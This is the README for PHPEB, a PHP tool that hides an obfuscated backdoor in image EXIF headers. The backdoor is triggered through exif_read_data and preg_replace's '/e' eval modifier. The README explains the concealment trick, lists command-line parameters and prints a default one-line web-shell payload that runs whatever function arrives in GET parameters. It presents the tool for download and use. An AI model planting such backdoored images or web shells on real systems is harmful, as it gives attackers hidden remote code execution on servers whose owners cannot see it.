PHP EXIF Backdoors generator using custom shellcode
==================

> PHPEB is a small tool that generates and stores obfuscated shellcode in user specified EXIF handlers. The backdoor is divided into two parts. The first part is a mix of the exif_read_data function to read the image headers and the preg_replace function to execute the content. 

> Both functions are harmless by themselves. Exif_read_data is commonly used to read images and preg_replace to replace the content of strings. However, preg_replace has a hidden and tricky option where if you pass the “/e” modifier it will execute the content (eval), instead of just searching/replacing.

> Another interesting point is that the image that we generate still loads and works properly. 

> Started from Sucuri Research.


* __Version__ : 1.0
* __Website__ : [Cyber Security Research Center from Romania](http://ccsir.org)
* __Contact__ : contact [at] ccsir [dot] org
 
##Usage
> php phpeb.php [params]

##Params
* -i path_to_image.jpg
* -o path_to_backdoored_image.jpg
* -s shellcode (optional)
* -h EXIF headers (N/A in v1.0, Default:Make,Model)
* -v verbose 1 or 0(optional, Default:0)
* Default: !empty(\$1=@\$_GET[1]) && \$1(\$_GET[2]);
	
##Help
  - No need. Just download these files and upload in an environment that supports PHP. You can send any feedback
    or questions to contact [at] ccsir [dot] org

##License

Copyright (C) 2013 Cyber Security Research Center from Romania

This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program; if not, see <http://www.gnu.org/licenses/>.    
